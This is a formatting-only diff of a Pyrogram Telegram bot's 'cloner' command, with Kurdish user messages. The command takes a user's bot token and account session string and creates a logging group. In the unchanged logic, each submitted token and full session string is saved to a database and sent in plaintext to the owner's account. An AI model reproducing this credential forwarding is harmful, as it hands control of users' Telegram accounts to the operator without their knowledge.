@@ -422,8 +422,10 @@ async def codev2(client, message):
 
 
 import re
+
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
+from pyrogram.types import ChatPrivileges, InlineKeyboardButton, InlineKeyboardMarkup
+
 
 @app.on_message(filters.command(["دروستکردنی بۆت", "• دروستکردنی بۆت •"], ""))
 async def cloner(app, message):
@@ -433,54 +435,82 @@ async def cloner(app, message):
         return await message.reply_text(
             f"**👋🏻 ꒐ بۆت ناچالاککراوە \n👾 ꒐ نامە بۆ گەشەپێدەر بنێرە\n🧑🏻‍💻 ꒐ گەشەپێدەر : @{OWNER[0]}**",
             reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}")]]
-            )
+                [
+                    [
+                        InlineKeyboardButton(
+                            "˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}"
+                        )
+                    ]
+                ]
+            ),
         )
 
     # Extracting arguments from the command
     args = message.text.split()
     if len(args) < 3:  # Check if both token and session are provided
-        return await message.reply_text("**◗⋮◖ تکایە تۆکن و کۆدی یاریدەدەر بنێرە بە شێوەی : `دروستکردنی بۆت token session`**")
-    
+        return await message.reply_text(
+            "**◗⋮◖ تکایە تۆکن و کۆدی یاریدەدەر بنێرە بە شێوەی : `دروستکردنی بۆت token session`**"
+        )
+
     token = args[1]
     session = args[2]
 
     # Validate bot token format
-    if not re.match(r'^\d{9}:[A-Za-z0-9_-]{35}$', token):
-        return await message.reply_text("**◗⋮◖ تۆکنی بۆت هەڵەیە، تکایە بۆت تۆکنی دروست بنێرە 💎.**")
+    if not re.match(r"^\d{9}:[A-Za-z0-9_-]{35}$", token):
+        return await message.reply_text(
+            "**◗⋮◖ تۆکنی بۆت هەڵەیە، تکایە بۆت تۆکنی دروست بنێرە 💎.**"
+        )
 
     try:
         # Bot token validation
         await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
-        bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
+        bot = Client(
+            "Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True
+        )
         await bot.start()
     except Exception as e:
         return await message.reply_text(f"**◗⋮◖ تۆکنی بۆت هەڵەیە 💎: {str(e)}**")
-    
+
     bot_info = await bot.get_me()
     if await is_served_bot(bot_info.username) or bot_info.username in Done:
         await bot.stop()
         return await message.reply_text("**◗⋮◖ ناتوانی بۆت دروست بکەیت ⚡.**")
 
-    user_client = Client("ALINA", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
+    user_client = Client(
+        "ALINA",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        session_string=session,
+        in_memory=True,
+    )
     try:
         await user_client.start()
     except Exception as e:
         await bot.stop()
         return await message.reply_text(f"**◗⋮◖ کۆدی یاریدەدەر هەڵەیە ⚡: {str(e)}**")
-    
+
     # Creating group and setting up permissions
-    group = await user_client.create_supergroup("گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات")
+    group = await user_client.create_supergroup(
+        "گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
+    )
     if bot_info.photo:
         photo = await bot.download_media(bot_info.photo.big_file_id)
         await user_client.set_chat_photo(group.id, photo=photo)
-    
+
     await user_client.add_chat_members(group.id, bot_info.username)
     await user_client.promote_chat_member(
-        group.id, bot_info.username,
-        privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True,
-                                  can_restrict_members=True, can_pin_messages=True, can_promote_members=True,
-                                  can_manage_chat=True, can_manage_video_chats=True)
+        group.id,
+        bot_info.username,
+        privileges=ChatPrivileges(
+            can_change_info=True,
+            can_invite_users=True,
+            can_delete_messages=True,
+            can_restrict_members=True,
+            can_pin_messages=True,
+            can_promote_members=True,
+            can_manage_chat=True,
+            can_manage_video_chats=True,
+        ),
     )
     group_link = await user_client.export_chat_invite_link(group.id)
     await user_client.stop()
@@ -488,14 +518,24 @@ async def cloner(app, message):
 
     # Logging the created bot
     dev_id = message.chat.id if message.chat.username not in OWNER else OWNER[0]
-    Bots.insert_one({"bot_username": bot_info.username, "token": token, "session": session, "dev": dev_id, "logger": group.id, "logger_mode": "ON"})
-    
+    Bots.insert_one(
+        {
+            "bot_username": bot_info.username,
+            "token": token,
+            "session": session,
+            "dev": dev_id,
+            "logger": group.id,
+            "logger_mode": "ON",
+        }
+    )
+
     await message.reply_text(
         f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n⟨ [{group_link}] ⟩**",
-        disable_web_page_preview=True
+        disable_web_page_preview=True,
     )
     await app.send_message(
-        OWNER[0], f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_info.username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {group_link} 🚦⚡.**",
+        OWNER[0],
+        f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_info.username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {group_link} 🚦⚡.**",
     )
 
 
